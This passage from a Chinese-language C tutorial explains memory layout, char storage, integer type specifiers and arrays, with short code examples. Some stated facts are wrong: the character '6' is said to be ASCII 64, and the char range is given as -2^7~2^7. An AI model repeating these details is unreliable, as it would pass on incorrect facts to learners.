<li>CPU 通过控制线发出内存读取命令，选中存储器芯片，并通知它，将要从中读取数据</li>
<li>存储器将 FFFFFFFB 号单元中的数据 8 通过数据线送入 CPU寄存器中</li>
</ul>
<p><img src="/2022/01/15/C/2fb17f543aa500524932669a322cd57a.png" alt="img"></p>
<p>变量的存储原则</p>
<ul>
<li>先分配字节地址大内存,然后分配字节地址小的内存(内存寻址是由大到小)</li>
<li>变量的首地址,是变量所占存储空间字节地址(最小的那个地址 )</li>
<li>低位保存在低地址字节上,高位保存在高地址字节上</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10的二进制: 0b00000000 00000000 00000000 00001010</span><br><span class="line">           高字节←                        →低字节</span><br></pre></td></tr></table></figure>

<h2 id="char类型内存存储细节"><a href="#char类型内存存储细节" class="headerlink" title="char类型内存存储细节"></a>char类型内存存储细节</h2><ul>
<li>char类型基本概念<ul>
<li>char是C语言中比较灵活的一种数据类型，称为“字符型”</li>
<li>char类型变量占1个字节存储空间，共8位</li>
<li>除单个字符以外, C语言的的转义字符也可以利用char类型存储</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>字符</strong></th>
<th align="center"><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">\b</td>
<td align="center">退格(BS)当前位置向后回退一个字符</td>
</tr>
<tr>
<td align="center">\r</td>
<td align="center">回车(CR),将当前位置移至本行开头</td>
</tr>
<tr>
<td align="center">\n</td>
<td align="center">换行(LF),将当前位置移至下一行开头</td>
</tr>
<tr>
<td align="center">\t</td>
<td align="center">水平制表(HT),跳到下一个 TAB 位置</td>
</tr>
<tr>
<td align="center">\0</td>
<td align="center">用于表示字符串的结束标记</td>
</tr>
<tr>
<td align="center">\</td>
<td align="center">代表一个反斜线字符 \</td>
</tr>
<tr>
<td align="center">&quot;</td>
<td align="center">代表一个双引号字符”</td>
</tr>
<tr>
<td align="center">\’</td>
<td align="center">代表一个单引号字符’</td>
</tr>
</tbody></table>
<p>char型数据存储原理</p>
<ul>
<li>计算机只能识别0和1, 所以char类型存储数据并不是存储一个字符, 而是将字符转换为0和1之后再存储</li>
<li>正是因为存储字符类型时需要将字符转换为0和1, 所以为了统一, 老美就定义了一个叫做ASCII表的东东</li>
<li>ASCII表中定义了每一个字符对应的整数</li>
</ul>
<p><img src="/2022/01/15/C/b519ba9d45ab584c43c991777d8e978a.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch1 = &#x27;a&#x27;; </span><br><span class="line">printf(&quot;%i\n&quot;, ch1); // 97</span><br><span class="line"></span><br><span class="line">char ch2 = 97;</span><br><span class="line">printf(&quot;%c\n&quot;, ch2); // a</span><br></pre></td></tr></table></figure>

<p>char类型注意点</p>
<ul>
<li>char类型占一个字节, 一个中文字符占3字节(unicode表),所有char不可以存储中文</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c = &#x27;我&#x27;; // 错误写法</span><br></pre></td></tr></table></figure>

<ul>
<li>除转义字符以外, 不支持多个字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch = &#x27;ab&#x27;; // 错误写法</span><br></pre></td></tr></table></figure>

<ul>
<li>char类型存储字符时会先查找对应的ASCII码值, 存储的是ASCII值, 所以字符6和数字6存储的内容不同</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch1 = &#x27;6&#x27;; // 存储的是ASCII码 64</span><br><span class="line">char ch2 = 6; //  存储的是数字 6</span><br></pre></td></tr></table></figure>

<ul>
<li>练习<ul>
<li>定义一个函数, 实现输入一个小写字母,要求转换成大写输出</li>
</ul>
</li>
</ul>
<h2 id="类型说明符"><a href="#类型说明符" class="headerlink" title="类型说明符"></a>类型说明符</h2><ul>
<li><p>类型说明符基本概念</p>
<ul>
<li><p>C语言提供了</p>
<p>说明长度</p>
<p>和</p>
<p>说明符号位</p>
<p>的两种类型说明符, 这两种类型说明符一共有4个：</p>
<ul>
<li>short 短整型 (说明长度)</li>
<li>long 长整型 (说明长度)</li>
<li>signed 有符号型 (说明符号位)</li>
<li>unsigned 无符号型 (说明符号位)</li>
</ul>
</li>
</ul>
</li>
<li><p>这些说明符一般都是用来修饰int类型的，所以在使用时可以省略int</p>
</li>
<li><p>这些说明符都属于C语言关键字</p>
</li>
</ul>
<h2 id="short和long"><a href="#short和long" class="headerlink" title="short和long"></a>short和long</h2><ul>
<li>short和long可以提供不同长度的整型数，也就是可以改变整型数的取值范围。<ul>
<li>在64bit编译器环境下，int占用4个字节（32bit），取值范围是-2^31 ~ 2^31-1；</li>
<li>short占用2个字节（16bit），取值范围是-2^15 ~ 2^15-1；</li>
<li>long占用8个字节（64bit），取值范围是-2^63 ~ 2^63-1</li>
</ul>
</li>
<li>总结一下：在64位编译器环境下:<ul>
<li>short占2个字节(16位)</li>
<li>int占4个字节(32位)</li>
<li>long占8个字节(64位)。</li>
<li>因此，如果使用的整数不是很大的话，可以使用short代替int，这样的话，更节省内存开销。</li>
</ul>
</li>
<li>世界上的编译器林林总总，不同编译器环境下，int、short、long的取值范围和占用的长度又是不一样的。比如在16bit编译器环境下，long只占用4个字节。不过幸运的是，ANSI \ ISO制定了以下规则：<ul>
<li>short跟int至少为16位(2字节)</li>
<li>long至少为32位(4字节)</li>
<li><strong>short的长度不能大于int，int的长度不能大于long</strong></li>
<li><strong>char一定为为8位(1字节)，毕竟char是我们编程能用的最小数据类型</strong></li>
</ul>
</li>
<li>可以连续使用2个long，也就是long long。一般来说，long long的范围是不小于long的，比如在32bit编译器环境下，long long占用8个字节，long占用4个字节。不过在64bit编译器环境下，long long跟long是一样的，都占用8个字节。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// char占1个字节, char的取值范围 -2^7~2^7</span></span><br><span class="line">    <span class="keyword">char</span> num = <span class="number">129</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size = %i\n&quot;</span>, <span class="keyword">sizeof</span>(num)); <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num = %i\n&quot;</span>, num); <span class="comment">// -127</span></span><br><span class="line">    <span class="comment">// short int 占2个字节, short int的取值范围 -2^15~2^15-1</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> num1 = <span class="number">32769</span>;<span class="comment">// -32767</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size = %i\n&quot;</span>, <span class="keyword">sizeof</span>(num1)); <span class="comment">// 2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num1 = %hi\n&quot;</span>, num1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// int占4个字节, int的取值范围 -2^31~2^31-1</span></span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">12345678901</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size = %i\n&quot;</span>, <span class="keyword">sizeof</span>(num2)); <span class="comment">// 4</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num2 = %i\n&quot;</span>, num2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// long在32位占4个字节, 在64位占8个字节</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> num3 = <span class="number">12345678901</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size = %i\n&quot;</span>, <span class="keyword">sizeof</span>(num3)); <span class="comment">// 4或8</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num3 = %ld\n&quot;</span>, num3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// long在32位占8个字节, 在64位占8个字节 -2^63~2^63-1</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> num4 = <span class="number">12345678901</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size = %i\n&quot;</span>, <span class="keyword">sizeof</span>(num4)); <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num4 = %lld\n&quot;</span>, num4);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 由于short/long/long long一般都是用于修饰int, 所以int可以省略</span></span><br><span class="line">    <span class="keyword">short</span> num5 = <span class="number">123</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num5 = %lld\n&quot;</span>, num5);</span><br><span class="line">    <span class="keyword">long</span> num6 = <span class="number">123</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num6 = %lld\n&quot;</span>, num6);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> num7 = <span class="number">123</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num7 = %lld\n&quot;</span>, num7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="signed和unsigned"><a href="#signed和unsigned" class="headerlink" title="signed和unsigned"></a>signed和unsigned</h2><ul>
<li>首先要明确的：signed int等价于signed，unsigned int等价于unsigned</li>
<li>signed和unsigned的区别就是它们的最高位是否要当做符号位，并不会像short和long那样改变数据的长度，即所占的字节数。<ul>
<li>signed：表示有符号，也就是说最高位要当做符号位。但是int的最高位本来就是符号位，因此signed和int是一样的，signed等价于signed int，也等价于int。signed的取值范围是-2^31 ~ 2^31 - 1</li>
<li>unsigned：表示无符号，也就是说最高位并不当做符号位，所以不包括负数。</li>
<li>因此unsigned的取值范围是：0000 0000 0000 0000 0000 0000 0000 0000 ~ 1111 1111 1111 1111 1111 1111 1111 1111，也就是0 ~ 2^32 - 1</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.默认情况下所有类型都是由符号的</span></span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">-9</span>;</span><br><span class="line">    <span class="keyword">int</span> num3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num1 = %i\n&quot;</span>, num1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num2 = %i\n&quot;</span>, num2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num3 = %i\n&quot;</span>, num3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.signed用于明确说明, 当前保存的数据可以是有符号的, 一般情况下很少使用</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> num4 = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> num5 = <span class="number">-9</span>;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> num6 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num4 = %i\n&quot;</span>, num4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num5 = %i\n&quot;</span>, num5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num6 = %i\n&quot;</span>, num6);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// signed也可以省略数据类型, 但是不推荐这样编写</span></span><br><span class="line">    <span class="keyword">signed</span> num7 = <span class="number">9</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num7 = %i\n&quot;</span>, num7);</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.unsigned用于明确说明, 当前不能保存有符号的值, 只能保存0和正数</span></span><br><span class="line">    <span class="comment">// 应用场景: 保存银行存款,学生分数等不能是负数的情况</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> num8 = <span class="number">-9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> num9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> num10 = <span class="number">9</span>;</span><br><span class="line">    <span class="comment">// 注意: 不看怎么存只看怎么取</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num8 = %u\n&quot;</span>, num8);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num9 = %u\n&quot;</span>, num9);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;num10 = %u\n&quot;</span>, num10);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>修饰符号的说明符可以和修饰长度的说明符混合使用</li>
<li>相同类型的说明符不能混合使用</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signed short int num1 = 666;</span><br><span class="line">signed unsigned int num2 = 666; // 报错</span><br></pre></td></tr></table></figure>

<h2 id="数组的基本概念"><a href="#数组的基本概念" class="headerlink" title="数组的基本概念"></a>数组的基本概念</h2><ul>
<li>数组，从字面上看，就是一组数据的意思，没错，数组就是用来存储一组数据的<ul>
<li>在C语言中,数组属于<strong>构造数据类型</strong></li>
</ul>
</li>
<li>数组的几个名词<ul>
<li>数组:一组<code>相同数据类型</code>数据的<code>有序</code>的集合</li>
<li>数组元素: 构成数组的每一个数据。</li>
<li>数组的下标: 数组元素位置的索引(从0开始)</li>
</ul>
</li>
<li>数组的应用场景<ul>
<li>一个int类型的变量能保存一个人的年龄，如果想保存整个班的年龄呢？<ul>
<li>第一种方法是定义很多个int类型的变量来存储</li>
<li>第二种方法是只需要定义一个int类型的数组来存储</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    // 需求: 保存2个人的分数</span></span><br><span class="line"><span class="comment">    int score1 = 99;</span></span><br><span class="line"><span class="comment">    int score2 = 60;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    // 需求: 保存全班同学的分数(130人)</span></span><br><span class="line"><span class="comment">    int score3 = 78;</span></span><br><span class="line"><span class="comment">    int score4 = 68;</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    int score130 = 88;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 数组: 如果需要保存`一组``相同类型`的数据, 就可以定义一个数组来保存</span></span><br><span class="line">    <span class="comment">// 只要定义好一个数组, 数组内部会给每一块小的存储空间一个编号, 这个编号我们称之为 索引, 索引从0开始</span></span><br><span class="line">    <span class="comment">// 1.定义一个可以保存3个int类型的数组</span></span><br><span class="line">    <span class="keyword">int</span> scores[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.通过数组的下标往数组中存放数据</span></span><br><span class="line">    scores[<span class="number">0</span>] = <span class="number">998</span>;</span><br><span class="line">    scores[<span class="number">1</span>] = <span class="number">123</span>;</span><br><span class="line">    scores[<span class="number">2</span>] = <span class="number">567</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 3.通过数组的下标从数组中取出存放的数据</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, scores[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, scores[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, scores[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h2><ul>
<li>元素类型 数组名[元素个数];</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// int 元素类型</span></span><br><span class="line"><span class="comment">// ages 数组名称</span></span><br><span class="line"><span class="comment">// [10] 元素个数</span></span><br><span class="line"><span class="keyword">int</span> ages[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>

<h2 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h2><ul>
<li><strong>定义的同时初始化</strong></li>
<li>指定元素个数,完全初始化<ul>
<li>其中在{ }中的各数据值即为各元素的初值,各值之间用逗号间隔</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ages[<span class="number">3</span>] = &#123;<span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>不指定元素个数,完全初始化<ul>
<li>根据大括号中的元素的个数来确定数组的元素个数</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>指定元素个数,部分初始化<ul>
<li>没有显式初始化的元素,那么系统会自动将其初始化为0</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int nums[10] = &#123;1,2&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>指定元素个数,部分初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">5</span>] = &#123;[<span class="number">4</span>] = <span class="number">3</span>,[<span class="number">1</span>] = <span class="number">2</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>不指定元素个数,部分初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[] = &#123;[<span class="number">4</span>] = <span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>先定义后初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">3</span>];</span><br><span class="line">nums[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">nums[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">nums[<span class="number">2</span>] = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>没有初始化会怎样?<ul>
<li>如果定义数组后,没有初始化,数组中是有值的,是随机的垃圾数,所以如果想要正确使用数组应该要进行初始化。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">5</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums[<span class="number">4</span>]);</span><br><span class="line">输出结果:</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1606416312</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1606416414</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>注意点:</p>
</li>
<li><p>使用数组时不能超出数组的索引范围使用, 索引从0开始, 到元素个数-1结束</p>
</li>
<li><p>使用数组时不要随意使用未初始化的元素, 有可能是一个随机值</p>
</li>
<li><p>对于数组来说, 只能在定义的同时初始化多个值, 不能先定义再初始化多个值</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int ages[3];</span><br><span class="line">ages = &#123;4, 6, 9&#125;; // 报错</span><br></pre></td></tr></table></figure>

<h2 id="数组的使用"><a href="#数组的使用" class="headerlink" title="数组的使用"></a>数组的使用</h2><ul>
<li>通过下标（索引）访问：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 找到下标为0的元素, 赋值为10</span></span><br><span class="line">ages[<span class="number">0</span>]=<span class="number">10</span>;</span><br><span class="line"><span class="comment">// 取出下标为2的元素保存的值</span></span><br><span class="line"><span class="keyword">int</span> a = ages[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a = %d&quot;</span>, a);</span><br></pre></td></tr></table></figure>

<h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><ul>
<li>数组的遍历:遍历的意思就是有序地查看数组的每一个元素</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ages[<span class="number">4</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ages[%d] = %d\n&quot;</span>, i, ages[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组长度计算方法"><a href="#数组长度计算方法" class="headerlink" title="数组长度计算方法"></a>数组长度计算方法</h2><ul>
<li>因为数组在内存中占用的字节数取决于其存储的数据类型和数据的个数<ul>
<li>数组所占用存储空间 = 一个元素所占用存储空间 * 元素个数(数组长度)</li>
</ul>
</li>
<li>所以计算数组长度可以使用如下方法<br>数组的长度 = 数组占用的总字节数 / 数组元素占用的字节数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">int</span> ages[<span class="number">4</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">13</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> length =  <span class="keyword">sizeof</span>(ages)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;length = %d&quot;</span>, length);</span><br><span class="line">输出结果: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><ul>
<li>正序输出(遍历)数组</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ages[<span class="number">4</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ages[%d] = %d\n&quot;</span>, i, ages[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>逆序输出(遍历)数组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int ages[4] = &#123;19, 22, 33, 13&#125;;</span><br><span class="line">for (int i = 3; i &gt;=0; i--) &#123;</span><br><span class="line">    printf(&quot;ages[%d] = %d\n&quot;, i, ages[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>从键盘输入数组长度,构建一个数组,然后再通过for循环从键 盘接收数字给数组初始化。并使用for循环输出查看</li>
</ul>
<hr>
<h2 id="数组内部存储细节"><a href="#数组内部存储细节" class="headerlink" title="数组内部存储细节"></a>数组内部存储细节</h2><ul>
<li><p>存储方式:</p>
<ul>
<li>1)内存寻址从大到小, 从高地址开辟一块连续没有被使用的内存给数组</li>
<li>2)从分配的连续存储空间中, 地址小的位置开始给每个元素分配空间</li>
<li>3)从每个元素分配的存储空间中, 地址最大的位置开始存储数据</li>
<li>4)用数组名指向整个存储空间最小的地址</li>
</ul>
</li>
<li><p>示例</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">char</span> cs[] = &#123;<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;j&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs = %p\n&quot;</span>, &amp;cs);       <span class="comment">// cs = 0060FEA9</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs[0] = %p\n&quot;</span>, &amp;cs[<span class="number">0</span>]); <span class="comment">// cs[0] = 0060FEA9</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs[1] = %p\n&quot;</span>, &amp;cs[<span class="number">1</span>]); <span class="comment">// cs[1] = 0060FEAA</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs[2] = %p\n&quot;</span>, &amp;cs[<span class="number">2</span>]); <span class="comment">// cs[2] = 0060FEAB</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nums[] = &#123;<span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nums = %p\n&quot;</span>, &amp;nums);      <span class="comment">// nums = 0060FEA0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nums[0] = %p\n&quot;</span>, &amp;nums[<span class="number">0</span>]);<span class="comment">// nums[0] = 0060FEA0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nums[1] = %p\n&quot;</span>, &amp;nums[<span class="number">1</span>]);<span class="comment">// nums[1] = 0060FEA4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/e0aa63f597f92632c90cd1c5f6adc292.png" alt="img"></p>
<ul>
<li><blockquote>
<p>注意:字符在内存中是以对应ASCII码值的二进制形式存储的,而非上述的形式。</p>
</blockquote>
</li>
</ul>
<h2 id="数组的越界问题"><a href="#数组的越界问题" class="headerlink" title="数组的越界问题"></a>数组的越界问题</h2><ul>
<li>数组越界导致的问题<ul>
<li>约错对象</li>
<li>程序崩溃</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">char</span> cs1[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> cs2[<span class="number">3</span>] = &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    cs2[<span class="number">3</span>] = <span class="number">88</span>; <span class="comment">// 注意:这句访问到了不属于cs1的内存</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs1[0] = %d\n&quot;</span>, cs1[<span class="number">0</span>] );</span><br><span class="line">输出结果: <span class="number">88</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>为什么上述会输出88, 自己按照”数组内部存储细节”画图脑补</p>
</blockquote>
<h2 id="数组注意事项"><a href="#数组注意事项" class="headerlink" title="数组注意事项"></a>数组注意事项</h2><ul>
<li>在定义数组的时候[]里面只能写整型常量或者是返回整型常量的表达式</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> ages4[<span class="string">&#x27;A&#x27;</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ages4[0] = %d\n&quot;</span>, ages4[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> ages5[<span class="number">5</span> + <span class="number">5</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>&#125;;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;ages5[0] = %d\n&quot;</span>, ages5[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> ages5[<span class="string">&#x27;A&#x27;</span> + <span class="number">5</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>&#125;;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;ages5[0] = %d\n&quot;</span>, ages5[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<ul>
<li>错误写法</li>
</ul>
